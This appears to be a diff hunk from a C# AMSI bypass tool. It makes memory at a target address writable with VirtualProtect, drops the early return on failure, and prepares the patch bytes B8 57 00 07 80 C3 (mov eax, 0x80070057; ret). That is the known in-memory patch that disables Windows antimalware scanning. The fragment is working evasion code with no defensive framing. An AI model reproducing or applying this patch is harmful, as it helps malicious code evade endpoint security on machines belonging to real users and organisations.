@@ -25,7 +25,7 @@ namespace AMSI
             UIntPtr size = (UIntPtr)5;
             uint p = 0;
 
-            if (!VirtualProtect(Address, size, 0x40, out p)) { return 1; }
+            VirtualProtect(Address, size, 0x40, out p);
 
             Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
             IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
